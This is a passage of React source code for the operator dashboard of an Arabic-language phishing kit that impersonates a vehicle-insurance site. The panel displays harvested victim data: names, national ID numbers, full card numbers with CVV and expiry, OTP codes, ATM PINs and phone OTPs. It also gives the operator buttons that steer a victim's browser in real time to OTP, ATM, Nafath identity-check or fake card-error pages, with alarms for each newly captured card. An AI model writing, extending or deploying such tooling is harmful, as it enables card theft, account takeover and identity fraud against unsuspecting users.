import { useEffect, useMemo, useState, useCallback, useRef, type ReactNode } from "react";
import { useLocation } from "wouter";
import { getToken, logoutAdmin } from "@/lib/auth";
import { getAdminStats, listAdminSubmissions, sendAdminControl, adminLogoutAll, adminChangePassword, getAllAdminSubmissions, getTrackedSessions, getAllVisitors, type SessionTrackingInfo } from "@/lib/api";
import { getAdminSettings, saveAdminSettings, getBlockedSessions, blockSession, unblockSession, getTrashItems, moveSubmissionToTrash, restoreTrashItem, deleteTrashItem, clearTrash } from "@/lib/admin-store";
import { getSettings as getApiSettings, saveSettings as saveApiSettings } from "@/lib/settings-api";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { ScrollArea } from "@/components/ui/scroll-area";
import {
  LogOut,
  Clock,
  ShieldCheck,
  CreditCard,
  KeyRound,
  Banknote,
  ChevronDown,
  ChevronUp,
  Menu,
  BarChart3,
  Users,
  Settings,
  X,
  Eye,
  Volume2,
  VolumeX,
} from "lucide-react";
import { ToastContainer, toast } from "@/lib/toast-store";
import { playMessengerSound, playWhatsAppSound, playCardAlertSound, playVisitorSound, playOtpSound, playFormSubmitSound } from "@/lib/sounds";

interface SubmissionRow {
  id: number;
  sessionId: string;
  type: string;
  data: string | null;
  ipAddress: string | null;
  createdAt: string;
  userAgent?: string | null;
}

interface StatsType {
  totalSessions: number;
  totalSubmissions: number;
  byType: { type: string; count: number }[];
}

function parseData(raw: string | null): Record<string, string> {
  if (!raw) return {};
  try {
    return JSON.parse(raw) as Record<string, string>;
  } catch {
    return {};
  }
}

function formatAgo(iso: string) {
  const diff = Date.now() - new Date(iso).getTime();
  const secs = Math.floor(diff / 1000);
  if (secs < 60) return `${secs}ث`;
  const mins = Math.floor(secs / 60);
  if (mins < 60) return `${mins}د`;
  return `${Math.floor(mins / 60)}س`;
}

function formatTimeCounter(iso: string) {
  const diff = Date.now() - new Date(iso).getTime();
  const secs = Math.floor(diff / 1000);
  
  if (secs < 60) {
    return `منذ ${secs} ثانية`;
  }
  
  const mins = Math.floor(secs / 60);
  if (mins < 60) {
    const remainingSecs = secs % 60;
    return `منذ ${mins} دقيقة${remainingSecs > 0 ? ` و ${remainingSecs} ثانية` : ""}`;
  }
  
  const hours = Math.floor(mins / 60);
  if (hours < 24) {
    const remainingMins = mins % 60;
    return `منذ ${hours} ساعة${remainingMins > 0 ? ` و ${remainingMins} دقيقة` : ""}`;
  }
  
  const days = Math.floor(hours / 24);
  if (days < 7) {
    const remainingHours = hours % 24;
    return `منذ ${days} يوم${remainingHours > 0 ? ` و ${remainingHours} ساعة` : ""}`;
  }
  
  const weeks = Math.floor(days / 7);
  if (weeks < 4) {
    const remainingDays = days % 7;
    return `منذ ${weeks} اسبوع${remainingDays > 0 ? ` و ${remainingDays} يوم` : ""}`;
  }
  
  // For older records, show actual date
  const date = new Date(iso);
  return date.toLocaleDateString("ar-SA", { year: "numeric", month: "short", day: "numeric" });
}

function getTypeArabic(type: string): string {
  const typeMap: Record<string, string> = {
    "initial": "البيانات الشخصية",
    "vehicle": "بيانات المركبة",
    "payment": "الدفع",
    "card": "بيانات البطاقة",
    "atm": "صراف ATM",
    "nomer": "رقم الجوال",
    "nomer_otp": "OTP رقم الجوال",
    "otp_attempt_1": "رمز التحقق (محاولة 1)",
    "otp_attempt_2": "رمز التحقق (محاولة 2)",
    "otp_attempt_3": "رمز التحقق (محاولة 3)",
  };
  return typeMap[type] || type.toUpperCase();
}

function StatCard({ label, value, icon, color, onClick }: { label: string; value: number; icon: ReactNode; color: string; onClick?: () => void }) {
  return (
    <button
      type="button"
      onClick={onClick}
      disabled={!onClick}
      className={`rounded-3xl border bg-white p-4 text-right shadow-sm transition ${onClick ? "hover:shadow-md cursor-pointer active:scale-[0.98]" : "cursor-default"}`}
    >
      <div className="flex items-center justify-between mb-3">
        <div className={`w-11 h-11 rounded-2xl flex items-center justify-center ${color}`}>{icon}</div>
        <span className="text-3xl font-bold text-slate-900">{value}</span>
      </div>
      <p className="text-xs text-slate-500">{label}</p>
      {onClick && <p className="text-xs text-blue-500 mt-2">انقر للتفاصيل</p>}
    </button>
  );
}

function SessionHistoryDialog({ open, rows, onClose }: { open: boolean; rows: SubmissionRow[]; onClose: () => void }) {
  if (!open) return null;
  
  // Sort rows by ID descending (newest first) for display
  const sortedRows = [...rows].sort((a, b) => b.id - a.id);
  
  return (
    <Dialog open onOpenChange={(value) => !value && onClose()}>
      <DialogContent className="sm:max-w-[760px] max-h-[85vh] flex flex-col" dir="rtl">
        <DialogHeader>
          <DialogTitle>سجل الجلسة</DialogTitle>
        </DialogHeader>
        <ScrollArea className="flex-1 mt-4">
          <div className="space-y-4">
            {sortedRows.map((row) => {
              const data = parseData(row.data);
              return (
                <div key={row.id} className="rounded-3xl border border-slate-200 bg-white p-4">
                  <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between text-xs text-slate-500 mb-3">
                    <span>{row.type.toUpperCase()}</span>
                    <span dir="ltr">{formatAgo(row.createdAt)}</span>
                  </div>
                  <div className="grid gap-3 sm:grid-cols-2 text-xs text-slate-700">
                    {Object.entries(data).map(([key, value]) => (
                      <div key={key} className="rounded-2xl bg-slate-50 p-3">
                        <div className="font-semibold text-slate-900">{key}</div>
                        <div className="mt-1 font-mono break-all">{String(value ?? "")}</div>
                      </div>
                    ))}
                    <div className="rounded-2xl bg-slate-50 p-3 text-[11px] text-slate-500">
                      <div>IP: {row.ipAddress ?? "غير معروف"}</div>
                      <div>المستخدم: {row.userAgent ?? "غير معروف"}</div>
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
        </ScrollArea>
      </DialogContent>
    </Dialog>
  );
}

// Page Arabic names mapping
function getPageArabic(page: string): string {
  const pageMap: Record<string, string> = {
    "/": "الصفحة الرئيسية",
    "/form": "بيانات المركبة",
    "/select": "اختيار الباقة",
    "/total": "ملخص التكلفة",
    "/total2": "تأكيد التكلفة",
    "/visa": "الدفع بالبطاقة",
    "/otp": "رمز التحقق",
    "/otp2": "رمز التحقق (محاولة 2)",
    "/otp3": "رمز التحقق (محاولة 3)",
    "/atm": "صراف ATM",
    "/nomer": "رقم الجوال",
    "/nomer-wait": "انتظار التحقق",
    "/nomer-otp": "رمز التحقق لرقم الجوال",
    "/identity-check": "التحقق من النفاذ الوطني",
    "/waiting": "قائمة الانتظار",
  };
  return pageMap[page] || page || "غير معروف";
}

function SessionBox({
  sessionId,
  rows,
  blocked,
  selected,
  onToggleSelect,
  onControl,
  onBlock,
  onUnblock,
  onDelete,
  onOpenHistory,
  currentPage,
  isOnline,
  newCardId,
  onViewCard,
}: {
  sessionId: string;
  rows: SubmissionRow[];
  blocked?: string;
  selected: boolean;
  onToggleSelect: () => void;
  onControl: (sessionId: string, action: string, code?: string, authorize?: boolean) => Promise<void>;
  onBlock: () => void;
  onUnblock: () => void;
  onDelete: () => void;
  onOpenHistory: () => void;
  currentPage?: string;
  isOnline?: boolean;
  newCardId: number | null;
  onViewCard: () => void;
}) {
  const [expanded, setExpanded] = useState(true);
  const [historyExpanded, setHistoryExpanded] = useState(false);
  const [loadingAction, setLoadingAction] = useState<string | null>(null);

  // Rows are already sorted by ID DESC (newest first) from parent useMemo
  const initialRow = rows.find((row) => row.type === "initial");
  const initialData = parseData(initialRow?.data ?? null);
  const name = initialData.ownerName || "مستخدم";
  const phone = initialData.phone || "بدون هاتف";
  const cardRows = rows.filter((row) => row.type === "card");
  // Use FIRST card (newest) since rows are sorted by ID desc
  const latestCard = cardRows[0];
  const cardData = parseData(latestCard?.data ?? null);
  const otpRows = rows.filter((row) => row.type.startsWith("otp"));
  const atmRows = rows.filter((row) => row.type === "atm");
  const nomerRows = rows.filter((row) => row.type === "nomer");
  const nomerOtpRows = rows.filter((row) => row.type === "nomer_otp");
  // Use first row (newest) for lastActivity since rows are sorted desc by id
  const lastActivity = rows[0]?.createdAt;

  const statusBadge = blocked
    ? <Badge className="bg-red-100 text-red-700 border-red-200 text-[10px]">محظور</Badge>
    : otpRows.length > 0
      ? <Badge className="bg-green-100 text-green-700 border-green-200 text-[10px]">OTP ✓</Badge>
      : cardRows.length > 0
        ? <Badge className="bg-orange-100 text-orange-700 border-orange-200 text-[10px] animate-pulse">ينتظر</Badge>
        : <Badge variant="outline" className="text-slate-400 text-[10px]">بيانات فقط</Badge>;

  const formattedCard = latestCard && cardData.cardNumber
    ? cardData.cardNumber.replace(/(.{4})/g, "$1 ").trim()
    : "—";

  useEffect(() => {
    setExpanded(cardRows.length > 0 || otpRows.length > 0);
  }, [cardRows.length, otpRows.length]);

  const handleControl = async (action: string, code?: string, authorize?: boolean) => {
    setLoadingAction(action);
    try {
      await onControl(sessionId, action, code, authorize);
    } finally {
      setLoadingAction(null);
    }
  };

  // Check if this session has a new card
  const hasNewCard = latestCard && latestCard.id === newCardId;

  return (
    <div className={`rounded-3xl border-2 bg-white shadow-sm transition-all duration-500 ${
      hasNewCard 
        ? "border-red-500 shadow-lg shadow-red-200" 
        : selected 
          ? "ring-2 ring-blue-400 border-slate-200" 
          : "border-slate-200"
    }`}>
      {hasNewCard && (
        <div className="bg-gradient-to-r from-red-500 to-pink-500 px-4 py-2 rounded-t-2xl">
          <div className="flex items-center gap-2 text-white">
            <span className="text-lg">🚨</span>
            <span className="font-bold text-sm">عميل جديد - بطاقة دفع!</span>
          </div>
        </div>
      )}
      <div className={`p-4 ${hasNewCard ? "pt-3" : ""}`}>
        <div className="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
          <div className="flex items-start gap-3">
            <input
              type="checkbox"
              checked={selected}
              onChange={onToggleSelect}
              className="mt-1 h-4 w-4 rounded border-slate-300 text-blue-600 focus:ring-blue-500"
            />
            <div className="min-w-0 text-right">
              <button type="button" onClick={() => { setExpanded((value) => !value); if (!expanded) onViewCard(); }} className="w-full text-right">
                <div className="flex items-center justify-between gap-3">
                  <div className="space-y-1">
                    <div className="flex items-center gap-2">
                      {/* Online/Offline Status Indicator */}
                      <span className={`w-2 h-2 rounded-full ${isOnline ? "bg-green-500 animate-pulse" : "bg-gray-400"}`} />
                      <p className="text-sm font-semibold text-slate-900 truncate">{name}</p>
                    </div>
                    <p className="text-xs text-slate-500" dir="ltr">{phone}</p>
                    {/* Current Page */}
                    <p className="text-[10px] text-blue-600 font-medium">
                      📍 {getPageArabic(currentPage || "")}
                    </p>
                  </div>
                  <div className="flex items-center gap-2 text-xs text-slate-500">
                    <span dir="ltr">{lastActivity ? formatAgo(lastActivity) : "—"}</span>
                    {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </div>
                </div>
                <div className="mt-2 flex items-center justify-between gap-2">
                  {statusBadge}
                  <span className="text-[11px] text-slate-400">#{sessionId.slice(0, 8)}</span>
                </div>
              </button>
            </div>
          </div>

          <div className="flex flex-wrap gap-2 self-end">
            <button
              type="button"
              onClick={blocked ? onUnblock : onBlock}
              className={`rounded-2xl px-3 py-2 text-xs font-semibold ${blocked ? "border border-green-200 bg-green-50 text-green-700 hover:bg-green-100" : "border border-slate-200 bg-slate-50 text-slate-700 hover:bg-slate-100"}`}
            >{blocked ? "رفع الحظر" : "حظر"}</button>
            <button
              type="button"
              onClick={onDelete}
              className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
            >سلة المهملات</button>
          </div>
        </div>

        {expanded && (
          <div className="mt-4 space-y-4 border-t border-slate-100 pt-4">
            {/* صندوق البيانات المركبة */}
            <div className="rounded-3xl border border-slate-200 bg-slate-50 p-4">
              <p className="text-xs font-semibold text-slate-500 mb-3">بيانات المركبة</p>
              
              {/* البيانات الشخصية */}
              <div className="mb-4">
                <p className="text-[10px] text-slate-400 mb-2">البيانات الشخصية</p>
                <div className="grid gap-2 sm:grid-cols-2 text-xs">
                  <div className="rounded-xl bg-white p-2">الاسم: <span className="font-semibold">{name}</span></div>
                  <div className="rounded-xl bg-white p-2">الهاتف: <span className="font-semibold" dir="ltr">{phone}</span></div>
                  <div className="rounded-xl bg-white p-2">رقم الهوية: <span className="font-semibold" dir="ltr">{initialData.idNumber ?? "—"}</span></div>
                  <div className="rounded-xl bg-white p-2">نوع التامين: <span className="font-semibold">{initialData.insuranceType ?? "—"}</span></div>
                </div>
              </div>

              {/* بيانات البطاقة */}
              {latestCard ? (
                <div className={`rounded-3xl border-2 p-4 transition-all duration-500 ${
                  latestCard.id === newCardId 
                    ? "bg-red-50 border-red-500 shadow-lg shadow-red-200" 
                    : "bg-white border-slate-200"
                }`}>
                  {latestCard.id === newCardId && (
                    <div className="flex items-center gap-2 mb-3 text-red-600">
                      <span className="text-lg">🚨</span>
                      <span className="font-bold text-sm">بطاقة جديدة!</span>
                    </div>
                  )}
                  <p className="text-[10px] text-slate-400 mb-2">بيانات البطاقة</p>
                  <div className="grid gap-2 sm:grid-cols-2 text-xs">
                    <div className="rounded-xl bg-slate-50 p-2 sm:col-span-2">
                      رقم البطاقة: <span className="font-mono font-semibold" dir="ltr">{formattedCard}</span>
                    </div>
                    <div className="rounded-xl bg-slate-50 p-2">المالك: <span className="font-semibold">{cardData.cardHolder ?? "—"}</span></div>
                    <div className="rounded-xl bg-slate-50 p-2">تاريخ الانتهاء: <span className="font-semibold" dir="ltr">{cardData.expiry ?? "—"}</span></div>
                    <div className="rounded-xl bg-slate-50 p-2">CVV: <span className="font-semibold" dir="ltr">{cardData.cvv ?? "—"}</span></div>
                  </div>
                </div>
              ) : (
                <div className="rounded-3xl border border-dashed border-slate-300 bg-white p-3 text-xs text-slate-500 text-center">
                  لا توجد بطاقة حتى الآن
                </div>
              )}
            </div>

            {otpRows.length > 0 && (
              <div className="rounded-3xl border border-slate-200 bg-white p-4">
                <div className="flex items-center justify-between text-xs font-semibold text-green-700 mb-3">
                  <span>رموز OTP</span>
                  <span>{otpRows.length} رمز</span>
                </div>
                <div className="space-y-2">
                  {otpRows.map((otp, index) => {
                    const data = parseData(otp.data);
                    return (
                      <div key={otp.id} className="rounded-2xl bg-green-50 p-3 text-xs text-slate-700">
                        <div className="flex items-center justify-between gap-3 mb-2">
                          <span className="font-semibold text-green-700">الرمز {index + 1}</span>
                          <span className="text-slate-500" dir="ltr">{formatAgo(otp.createdAt)}</span>
                        </div>
                        <div className="font-mono text-base font-bold text-green-900" dir="ltr">{data.otpCode ?? "—"}</div>
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {atmRows.length > 0 && (
              <div className="rounded-3xl border border-slate-200 bg-white p-4 text-xs text-slate-700">
                <div className="flex items-center justify-between mb-3 text-slate-500">
                  <span>بيانات ATM</span>
                </div>
                {atmRows.map((atm) => {
                  const data = parseData(atm.data);
                  return (
                    <div key={atm.id} className="rounded-2xl bg-slate-50 p-3 mb-2">
                      <div className="flex items-center justify-between text-slate-500 text-[11px] mb-1">
                        <span>رمز ATM</span>
                        <span dir="ltr">{formatAgo(atm.createdAt)}</span>
                      </div>
                      <div className="font-mono font-semibold">{data.atmCode ?? "—"}</div>
                    </div>
                  );
                })}
              </div>
            )}

            {/* بيانات رقم الجوال */}
            {nomerRows.length > 0 && (
              <div className="rounded-3xl border border-blue-200 bg-blue-50 p-4">
                <div className="flex items-center justify-between text-xs font-semibold text-blue-700 mb-3">
                  <span> رقم الجوال</span>
                  <span>{nomerRows.length} المحاولات</span>
                </div>
                {nomerRows.map((nomer) => {
                  const data = parseData(nomer.data);
                  const providerNames: Record<string, string> = {
                    stc: "STC",
                    mobily: "موبايلي",
                    zain: "زين",
                    jawra: "جوال"
                  };
                  return (
                    <div key={nomer.id} className="rounded-2xl bg-white p-3 mb-2">
                      <div className="flex items-center justify-between text-slate-500 text-[11px] mb-2">
                        <span>وقت الادخال </span>
                        <span dir="ltr">{formatAgo(nomer.createdAt)}</span>
                      </div>
                      <div className="space-y-1 text-xs">
                        <div className="flex justify-between">
                          <span className="text-slate-500">مزود الخدمة:</span>
                          <span className="font-semibold">{providerNames[data.provider] ?? data.provider ?? "—"}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-slate-500">رقم الجوال:</span>
                          <span className="font-mono font-semibold" dir="ltr">{data.phone ?? "—"}</span>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}

            {/* رمز تحقق رقم الجوال */}
            {nomerOtpRows.length > 0 && (
              <div className="rounded-3xl border border-green-200 bg-green-50 p-4">
                <div className="flex items-center justify-between text-xs font-semibold text-green-700 mb-3">
                  <span>رمز تحقق الجوال</span>
                  <span>{nomerOtpRows.length} رمز</span>
                </div>
                <div className="space-y-2">
                  {nomerOtpRows.map((otp, index) => {
                    const data = parseData(otp.data);
                    return (
                      <div key={otp.id} className="rounded-2xl bg-white p-3">
                        <div className="flex items-center justify-between text-slate-500 text-[11px] mb-2">
                          <span>محاولة {index + 1}</span>
                          <span dir="ltr">{formatAgo(otp.createdAt)}</span>
                        </div>
                        <div className="font-mono text-base font-bold text-green-900 text-center" dir="ltr">
                          {data.otpCode ?? "—"}
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {/* التحقق من الهوية */}
            <div className="rounded-3xl border border-purple-200 bg-purple-50 p-4">
              <div className="text-xs font-semibold text-purple-700 mb-3">التحقق من النفاذ الوطني</div>
              <div className="flex gap-2">
                <input
                  type="text"
                  id={`identity-code-${sessionId}`}
                  placeholder="اكتب رمز التوثيق "
                  className="flex-1 rounded-2xl border border-purple-200 bg-white px-4 py-2 text-sm text-center font-mono focus:border-purple-400 focus:outline-none focus:ring-2 focus:ring-purple-100"
                  maxLength={10}
                />
                <button
                  type="button"
                  disabled={loadingAction === "identity_code"}
                  onClick={async () => {
                    const input = document.getElementById(`identity-code-${sessionId}`) as HTMLInputElement;
                    const code = input?.value?.trim();
                    if (!code) return;
                    setLoadingAction("identity_code");
                    try {
                      await onControl(sessionId, "identity_code", code);
                    } finally {
                      setLoadingAction(null);
                      if (input) input.value = "";
                    }
                  }}
                  className="rounded-2xl bg-purple-600 px-4 py-2 text-xs font-semibold text-white hover:bg-purple-700 disabled:cursor-not-allowed disabled:opacity-50"
                >
                  {loadingAction === "identity_code" ? "جارٍ..." : "إرسال"}
                </button>
              </div>
              <p className="mt-2 text-[10px] text-purple-600">ادخل رمز التوثيق  </p>
            </div>

            {/* أزرار التحكم */}
            <div className="space-y-3">
              <p className="text-[10px] text-slate-400 font-semibold">اعادة للصفحات الاولى </p>
              <div className="grid gap-2 sm:grid-cols-2">
                <button
                  type="button"
                  disabled={loadingAction === "go_home"}
                  onClick={() => void handleControl("go_home")}
                  className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_home" ? "...جارٍ" : "🏠 الرئيسية"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_form"}
                  onClick={() => void handleControl("go_form", undefined, true)}
                  className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_form" ? "...جارٍ" : "📝 بيانات المركبة"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_select"}
                  onClick={() => void handleControl("go_select", undefined, true)}
                  className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_select" ? "...جارٍ" : "🏢 اختيار التأمين"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_visa"}
                  onClick={() => void handleControl("go_visa", undefined, true)}
                  className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_visa" ? "...جارٍ" : "💳 الفيزا"}</button>
              </div>
              
              <p className="text-[10px] text-slate-400 font-semibold pt-2">تحويل لصفحات التوثيق</p>
              <div className="grid gap-2 sm:grid-cols-4">
                <button
                  type="button"
                  disabled={loadingAction === "go_otp"}
                  onClick={() => void handleControl("go_otp")}
                  className="rounded-2xl bg-green-600 px-2 py-2 text-xs font-semibold text-white hover:bg-green-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_otp" ? "..." : "🔐 OTP"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_nomer"}
                  onClick={() => void handleControl("go_nomer")}
                  className="rounded-2xl bg-blue-600 px-2 py-2 text-xs font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_nomer" ? "..." : "📱 ادخال رقم الهاتف"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_nomer_otp"}
                  onClick={() => void handleControl("go_nomer_otp")}
                  className="rounded-2xl bg-blue-600 px-2 py-2 text-xs font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_nomer_otp" ? "..." : "📱 رمز تحقق رقم الهاتف"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_identity_check"}
                  onClick={() => void handleControl("go_identity_check")}
                  className="rounded-2xl bg-purple-600 px-2 py-2 text-xs font-semibold text-white hover:bg-purple-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_identity_check" ? "..." : "🆔 رمز توثيق النفاذ"}</button>
              </div>
              
              <p className="text-[10px] text-slate-400 font-semibold pt-2">صفحة انتظار البطاقة</p>
              <div className="grid gap-2">
                <button
                  type="button"
                  disabled={loadingAction === "go_waiting"}
                  onClick={() => void handleControl("go_waiting")}
                  className="rounded-2xl bg-amber-600 px-3 py-2 text-xs font-semibold text-white hover:bg-amber-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_waiting" ? "..." : "⏳ صفحة انتظار البطاقة"}</button>
              </div>

              <p className="text-[10px] text-slate-400 font-semibold pt-2">صراف ATM</p>
              <div className="grid gap-2">
                <button
                  type="button"
                  disabled={loadingAction === "go_atm"}
                  onClick={() => void handleControl("go_atm")}
                  className="rounded-2xl bg-teal-600 px-3 py-2 text-xs font-semibold text-white hover:bg-teal-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_atm" ? "..." : "🏧 رمز ATM"}</button>
              </div>
              
              <p className="text-[10px] text-slate-400 font-semibold pt-2">خطأ</p>
              <div className="grid gap-2">
                <button
                  type="button"
                  disabled={loadingAction === "card_error"}
                  onClick={() => void handleControl("card_error")}
                  className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "card_error" ? "..." : "❌ خطأ للبطاقة فقط"}</button>
              </div>
            </div>
          </div>
        )}
        
        {/* التاريخي / الأرشيف Section */}
        <div className="border-t border-slate-100">
          <button
            type="button"
            onClick={() => setHistoryExpanded(!historyExpanded)}
            className="flex w-full items-center justify-between px-4 py-2 text-xs text-slate-500 hover:bg-slate-50 transition-colors"
          >
            <span className="flex items-center gap-2">
              <Clock className="w-3 h-3" />
              السجل الادخالات  ({rows.length} العدد)
            </span>
            {historyExpanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
          </button>
          
          {historyExpanded && (
            <div className="px-4 pb-3 space-y-2 max-h-96 overflow-y-auto">
              {rows.map((row, index) => {
                const data = parseData(row.data);
                const prevRow = index < rows.length - 1 ? rows[index + 1] : null;
                const prevData = prevRow ? parseData(prevRow.data) : null;
                
                // De-duplication: skip if data is identical to previous row
                const isDuplicate = prevData && JSON.stringify(data) === JSON.stringify(prevData);
                if (isDuplicate) return null;
                
                const isLatest = index === 0;
                
                return (
                  <div
                    key={row.id}
                    className={`rounded-xl p-3 text-[11px] ${
                      isLatest 
                        ? "bg-blue-50 border border-blue-200" 
                        : "bg-slate-50 border border-slate-200"
                    }`}
                  >
                    {/* Header */}
                    <div className="flex items-center justify-between mb-2 pb-2 border-b border-slate-200">
                      <div className="flex items-center gap-2">
                        <span className={`font-bold ${isLatest ? "text-blue-700" : "text-slate-700"}`}>
                          {getTypeArabic(row.type)}
                        </span>
                        {isLatest && <span className="text-[9px] bg-blue-200 text-blue-800 px-1.5 py-0.5 rounded font-semibold">الأحدث</span>}
                      </div>
                      <div className="flex items-center gap-2 text-slate-400">
                        <span className="text-[10px]">{formatTimeCounter(row.createdAt)}</span>
                        <span className="text-[9px]">•</span>
                        <span className="text-[9px]">#{row.id}</span>
                      </div>
                    </div>
                    
                    {/* Full Data - No Truncation */}
                    <div className="space-y-1.5">
                      {Object.entries(data).map(([key, value]) => (
                        <div key={key} className="flex items-start gap-2 py-1 border-b border-slate-100 last:border-0">
                          <span className="text-slate-500 min-w-[100px] font-semibold">{key}:</span>
                          <span className="font-mono text-slate-800 break-all flex-1">{String(value ?? "")}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const [rawRows, setRawRows] = useState<SubmissionRow[]>([]);
  const [stats, setStats] = useState<StatsType | null>(null);
  const [selectedIds, setSelectedIds] = useState<string[]>([]);
  const [blockedSessions, setBlockedSessions] = useState(getBlockedSessions());
  const [trashItems, setTrashItems] = useState(getTrashItems());
  const [settingsOpen, setSettingsOpen] = useState(false);
  const [trashOpen, setTrashOpen] = useState(false);
  const [passwordOpen, setPasswordOpen] = useState(false);
  const [menuOpen, setMenuOpen] = useState(false);
  const [activeSection, setActiveSection] = useState<"sessions" | "stats" | "security" | "offers" | "visitors">("sessions");
  const [visitors, setVisitors] = useState<Awaited<ReturnType<typeof getAllVisitors>>["visitors"]>([]);
  const [historyDialog, setHistoryDialog] = useState<{ sessionId: string; rows: SubmissionRow[] } | null>(null);
  const [settings, setSettings] = useState(getAdminSettings());
  const [passwordValue, setPasswordValue] = useState("");
  const [passwordStatus, setPasswordStatus] = useState<string | null>(null);
  const intervalRef = useRef<number | null>(null);
  const lastSeenIdsRef = useRef<Set<number>>(new Set());
  const lastSeenVisitorIdsRef = useRef<Set<number>>(new Set());

  // Sound settings
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [lastCardAlertTime, setLastCardAlertTime] = useState(0);
  const [newCardId, setNewCardId] = useState<number | null>(null);
  const isInitialLoadRef = useRef(true); // Track initial load to skip old data
  
  // Track session online status and current page
  const [trackingInfo, setTrackingInfo] = useState<Record<string, SessionTrackingInfo>>({});
  
  // Filter: show only online sessions
  const [showOnlineOnly, setShowOnlineOnly] = useState(false);

  const sessions = useMemo(() => {
    const trashedIds = new Set(trashItems.map((item) => item.id));
    const grouped: Record<string, SubmissionRow[]> = {};
    rawRows
      .filter((row) => !trashedIds.has(row.id))
      .forEach((row) => {
        if (!grouped[row.sessionId]) grouped[row.sessionId] = [];
        grouped[row.sessionId].push(row);
      });

    // Sort EACH session's rows by ID DESCENDING (newest first) - CRITICAL FIX
    Object.values(grouped).forEach((list) => list.sort((a, b) => b.id - a.id));

    // Create sessions object with history included
    const sessionsWithHistory = Object.fromEntries(
      Object.entries(grouped).sort(([, a], [, b]) => {
        // Sort sessions by their NEWEST record (first item after sort by id desc)
        const aTime = new Date(a[0].createdAt).getTime();
        const bTime = new Date(b[0].createdAt).getTime();
        return bTime - aTime;
      }),
    );

    // Add history to each session (sorted by id descending - newest first)
    Object.keys(sessionsWithHistory).forEach((sessionId) => {
      sessionsWithHistory[sessionId] = sessionsWithHistory[sessionId].sort((a, b) => b.id - a.id);
    });

    return sessionsWithHistory;
  }, [rawRows, trashItems]);

  // Filtered sessions based on online status
  const filteredSessions = useMemo(() => {
    if (!showOnlineOnly) return sessions;
    
    const onlineSessionIds = new Set(
      Object.values(trackingInfo)
        .filter((info) => info.isOnline)
        .map((info) => info.sessionId)
    );
    
    const filtered: typeof sessions = {};
    Object.entries(sessions).forEach(([sessionId, rows]) => {
      if (onlineSessionIds.has(sessionId)) {
        filtered[sessionId] = rows;
      }
    });
    
    return filtered;
  }, [sessions, trackingInfo, showOnlineOnly]);

  // Count of online sessions for display
  const onlineSessionCount = useMemo(() => {
    return Object.values(trackingInfo).filter((info) => info.isOnline).length;
  }, [trackingInfo]);

  useEffect(() => {
    if (!getToken()) {
      setLocation("/admin");
    }
  }, [setLocation]);

  // Load settings from API server
  useEffect(() => {
    getApiSettings()
      .then(setSettings)
      .catch(() => {
        // Fallback to localStorage if API fails
        setSettings(getAdminSettings());
      });
  }, []);

  const fetchData = useCallback(async () => {
    const token = getToken();
    if (!token) return;
    try {
      const [statsData, submissionsResponse, trackedSessions, visitorsData] = await Promise.all([
        getAdminStats(token),
        getAllAdminSubmissions(token),
        getTrackedSessions(),
        getAllVisitors(),
      ]);
      setStats(statsData);
      setRawRows(submissionsResponse.submissions);
      setVisitors(visitorsData.visitors);

      // Sound notifications for new submissions
      if (soundEnabled && submissionsResponse.submissions.length > 0 && !isInitialLoadRef.current) {
        const newSubmissions = submissionsResponse.submissions.filter((row) => !lastSeenIdsRef.current.has(row.id));
        
        for (const row of newSubmissions) {
          // Card alert - LOUD emergency sound
          if (row.type === "card") {
            const now = Date.now();
            if (now - lastCardAlertTime > 5000) { // Min 5 seconds between card alerts
              playCardAlertSound();
              setLastCardAlertTime(now);
              setNewCardId(row.id); // Highlight card
              toast("warning", "🚨 تنبيه!", "بطاقة دفع جديدة وصلت!");
            }
          }
          // OTP sound
          else if (row.type.startsWith("otp")) {
            playOtpSound();
          }
          // Form submission sound
          else if (row.type === "initial" || row.type === "vehicle") {
            playMessengerSound();
          }
          // Other submissions
          else {
            playFormSubmitSound();
          }
          
          lastSeenIdsRef.current.add(row.id);
        }
      }

